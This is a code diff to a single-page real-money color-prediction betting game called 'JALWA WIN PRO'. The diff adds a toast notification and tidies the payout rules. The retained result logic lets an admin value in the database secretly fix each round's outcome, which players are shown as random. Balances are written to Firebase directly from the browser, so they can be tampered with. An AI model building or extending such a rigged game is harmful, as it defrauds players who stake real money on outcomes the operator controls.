@@ -13,9 +13,12 @@
         :root { 
             --green: #1DB954; --violet: #9c27b0; --red: #ff4757; 
             --blue: #007AFF; --bg-dark: #0a0e1a; --card-bg: #161d2b;
-            --text-dim: #a4b0be;
+            --text-dim: #a4b0be; --cyan: #00ffca;
         }
         body { margin: 0; font-family: 'Poppins', sans-serif; background: var(--bg-dark); color: white; user-select: none; padding-bottom: 20px; }
+
+        /* TOAST NOTIFICATION */
+        #toastMsg { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:rgba(0,0,0,0.9); color:white; padding:15px 30px; border-radius:50px; border:1px solid var(--cyan); z-index:10000; font-weight:bold; text-align:center; box-shadow:0 0 20px rgba(0,255,202,0.3); }
 
         .nav { background: #161d2b; color: #00ffca; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #1f2855; }
         .bal-display { background: rgba(0,255,202,0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #00ffca; color: #00ffca; }
@@ -32,7 +35,6 @@
         .num-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; padding: 15px; }
         .num-btn { width: 50px; height: 50px; background: #1f2855; border: none; font-size: 18px; font-weight: bold; border-radius: 50%; cursor: pointer; color: white; display: flex; align-items: center; justify-content: center; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
 
-        /* ✅ TREND HISTORY STYLE (PAHLE JAISA) */
         .section-title { padding: 20px 15px 10px; font-size: 12px; font-weight: bold; color: var(--text-dim); }
         .h-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 18px 2px; padding: 20px 10px 30px; background: var(--card-bg); margin: 0 15px; border-radius: 15px; }
         .dot { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 11px; position: relative; margin: 0 auto; }
@@ -56,6 +58,8 @@
     </style>
 </head>
 <body>
+
+<div id="toastMsg"></div>
 
 <div class="nav"><span>JALWA WIN PRO</span><div class="bal-display">₹<span id="balDisplay">0.00</span></div></div>
 
@@ -119,113 +123,12 @@
     let userBalance = 0, currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, isLocked = false, lastProcessedPid = "";
     let myBets = JSON.parse(localStorage.getItem('my_jalwa_bets') || "[]");
 
-    db.ref('users/' + userId).on('value', snap => {
-        if(snap.exists()) { userBalance = snap.val().balance || 0; document.getElementById('balDisplay').innerText = userBalance.toFixed(2); }
-    });
-
-    function openBet(t) { if(isLocked) return; selectedType = t; multiplier = 1; updateBetUI(); document.getElementById('betModal').style.display='block'; document.getElementById('betHead').innerText = "Join " + t; document.getElementById('betHead').style.background = isNaN(t)?(t==='Green'?'#1DB954':t==='Red'?'#ff4757':'#9c27b0'):'#007AFF'; }
-    function setBase(v, el) { baseAmt = v; document.querySelectorAll('.chip').forEach(c => c.classList.remove('active')); el.classList.add('active'); updateBetUI(); }
-    function changeMult(v) { multiplier += v; if(multiplier < 1) multiplier = 1; updateBetUI(); }
-    function updateBetUI() { document.getElementById('multDisplay').innerText = multiplier; document.getElementById('totalTxt').innerText = (baseAmt * multiplier); }
-
-    async function confirmBet() {
-        let total = baseAmt * multiplier;
-        if(userBalance < total) return alert("Low Balance");
-        await db.ref('users/' + userId).update({ balance: userBalance - total });
-        let b = { pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 };
-        myBets.push(b); localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
-        db.ref('bets/' + currentP).push({ ...b, uid: userId });
-        document.getElementById('betModal').style.display = 'none';
-        updateOrderTable();
+    function showToast(msg) {
+        let t = document.getElementById('toastMsg');
+        t.innerText = msg;
+        t.style.display = 'block';
+        setTimeout(() => { t.style.display = 'none'; }, 2000);
     }
-
-    async function processResult(pid) {
-        if(!pid || lastProcessedPid === pid) return;
-        lastProcessedPid = pid;
-
-        // ✅ ADMIN COMMAND CHECK
-        const adminSnap = await db.ref('gameControl/nextResult').once('value');
-        let adminRes = adminSnap.exists() ? adminSnap.val() : "none";
-        
-        let n, col;
-        if(adminRes !== "none") {
-            if(typeof adminRes === 'number') n = adminRes;
-            else {
-                if(adminRes === 'Green') n = 1; else if(adminRes === 'Red') n = 2; else n = 5;
-            }
-            db.ref('gameControl/nextResult').set("none");
-        } else {
-            n = Math.floor(Math.random() * 10);
-        }
-
-        col = (n==0||n==5)?(n==0?'Red':'Green'):(n%2==0?'Red':'Green');
-        await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
-        
-        // Settle
-        let winSum = 0, hit = false;
-        myBets.forEach(b => {
-            if(b.pid === pid && b.status === 'Wait') {
-                hit = true; let win = false;
-                if(b.sel == n) win = true;
-                else if(b.sel == 'Green' && (n%2!=0 || n==5)) win = true;
-                else if(b.sel == 'Red' && (n%2==0 || n==0)) win = true;
-                if(win) { b.status = 'Win'; b.win = b.amt * 1.9; winSum += b.win; } else b.status = 'Loss';
-            }
-        });
-
-        if(hit) {
-            localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
-            if(winSum > 0) db.ref('users/'+userId).update({ balance: userBalance + winSum });
-            showTicket(n, col, winSum);
-            updateOrderTable();
-        }
-        fetchHistory();
-    }
-
-    function showTicket(n, c, w) {
-        document.getElementById('ticketOverlay').style.display='flex';
-        document.getElementById('tBall').innerText = n;
-        document.getElementById('tBall').className = "res-ball " + (n==0?'Mix':(n==5?'MixG':'c-'+c));
-        document.getElementById('tWinAmt').innerText = "₹" + w.toFixed(2);
-        document.getElementById('tWinAmt').style.color = w>0?'#1DB954':'#ff4757';
-    }
-
-    function updateOrderTable() {
-        let rows = ""; [...myBets].reverse().slice(0,10).forEach(b => {
-            rows += `<tr><td>${String(b.pid).slice(-3)}</td><td>${b.sel}</td><td>₹${b.amt}</td><td class="${b.status==='Win'?'win-amt':'loss-amt'}">${b.status}</td></tr>`;
-        });
-        document.getElementById('orderBody').innerHTML = rows || "<tr><td colspan='4'>No Bets</td></tr>";
-    }
-
-    async function fetchHistory() {
-        const { data } = await supabaseClient.from('game_history').select('*').order('id', {ascending:false}).limit(20);
-        if(data) document.getElementById('historyGrid').innerHTML = data.map(r => `<div class="dot ${r.num==0?'Mix':(r.num==5?'MixG':'c-'+r.col)}">${r.num}<span class="dot-pid">${String(r.pid).slice(-3)}</span></div>`).join('');
-    }
-
-    function sync() {
-        const now = new Date();
-        const rem = 30 - (now.getSeconds() % 30);
-        isLocked = rem <= 5;
-        document.getElementById('lockOverlay').style.display = isLocked ? 'flex' : 'none';
-        document.getElementById('timerDisplay').innerText = `00:${rem.toString().padStart(2,'0')}`;
-        let pId = now.getFullYear().toString() + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + Math.floor(((now.getHours()*3600)+(now.getMinutes()*60)+now.getSeconds())/30);
-        document.getElementById('pIdDisplay').innerText = pId;
-        if(currentP !== pId) { let old = currentP; currentP = pId; if(old) processResult(old); }
-    }
-
-    setInterval(sync, 1000);
-    window.onload = () => { fetchHistory(); updateOrderTable(); sync(); };
-</script>
-<script>
-    const firebaseConfig = { databaseURL: "https://jalwav7-default-rtdb.firebaseio.com" };
-    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const SB_URL = "https://orksbkahfantwdbwzrye.supabase.co", SB_KEY = "sb_publishable_F7ErxCXZz7Zpcpd2-yH-Bg_qDFL8tUI";
-    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
-
-    const userId = localStorage.getItem('jalwa_user_phone') || 'Guest';
-    let userBalance = 0, currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, isLocked = false, lastProcessedPid = "";
-    let myBets = JSON.parse(localStorage.getItem('my_jalwa_bets') || "[]");
 
     db.ref('users/' + userId).on('value', snap => {
         if(snap.exists()) { userBalance = snap.val().balance || 0; document.getElementById('balDisplay').innerText = userBalance.toFixed(2); }
@@ -238,12 +141,13 @@
 
     async function confirmBet() {
         let total = baseAmt * multiplier;
-        if(userBalance < total) return alert("Low Balance");
+        if(userBalance < total) return showToast("⚠️ Low Balance");
         await db.ref('users/' + userId).update({ balance: userBalance - total });
         let b = { pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 };
         myBets.push(b); localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
         db.ref('bets/' + currentP).push({ ...b, uid: userId });
         document.getElementById('betModal').style.display = 'none';
+        showToast("✅ Bet Placed!");
         updateOrderTable();
     }
 
@@ -257,13 +161,9 @@
         let n, col;
         if(adminRes !== "none") {
             if(typeof adminRes === 'number') n = adminRes;
-            else {
-                if(adminRes === 'Green') n = 1; else if(adminRes === 'Red') n = 2; else n = 5;
-            }
+            else { if(adminRes === 'Green') n = 1; else if(adminRes === 'Red') n = 2; else n = 5; }
             db.ref('gameControl/nextResult').set("none");
-        } else {
-            n = Math.floor(Math.random() * 10);
-        }
+        } else { n = Math.floor(Math.random() * 10); }
 
         col = (n==0||n==5)?(n==0?'Red':'Green'):(n%2==0?'Red':'Green');
         await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
@@ -271,38 +171,13 @@
         let winSum = 0, hit = false;
         myBets.forEach(b => {
             if(b.pid === pid && b.status === 'Wait') {
-                hit = true; 
-                let win = false;
-                let mult = 0;
+                hit = true; let win = false, mult = 0;
+                if(!isNaN(b.sel)) { if(Number(b.sel) === n) { win = true; mult = 9; } } 
+                else if(b.sel === 'Violet') { if(n === 0 || n === 5) { win = true; mult = 4.5; } }
+                else if(b.sel === 'Green') { if(n === 1 || n === 3 || n === 7 || n === 9) { win = true; mult = 2; } else if(n === 5) { win = true; mult = 1.5; } }
+                else if(b.sel === 'Red') { if(n === 2 || n === 4 || n === 6 || n === 8) { win = true; mult = 2; } else if(n === 0) { win = true; mult = 1.5; } }
 
-                // ✅ 9X MULTIPLIER FOR NUMBERS
-                if(!isNaN(b.sel)) {
-                    if(Number(b.sel) === n) { win = true; mult = 9; }
-                } 
-                // ✅ VIOLET MULTIPLIER (4.5X)
-                else if(b.sel === 'Violet') {
-                    if(n === 0 || n === 5) { win = true; mult = 4.5; }
-                }
-                // ✅ GREEN LOGIC (2X or 1.5X for 5)
-                else if(b.sel === 'Green') {
-                    if(n % 2 !== 0 || n === 5) { 
-                        win = true; mult = (n === 5) ? 1.5 : 2; 
-                    }
-                }
-                // ✅ RED LOGIC (2X or 1.5X for 0)
-                else if(b.sel === 'Red') {
-                    if(n % 2 === 0 || n === 0) { 
-                        win = true; mult = (n === 0) ? 1.5 : 2; 
-                    }
-                }
-
-                if(win) { 
-                    b.status = 'Win'; 
-                    b.win = b.amt * mult; 
-                    winSum += b.win; 
-                } else { 
-                    b.status = 'Loss'; 
-                }
+                if(win) { b.status = 'Win'; b.win = b.amt * mult; winSum += b.win; } else { b.status = 'Loss'; }
             }
         });
 
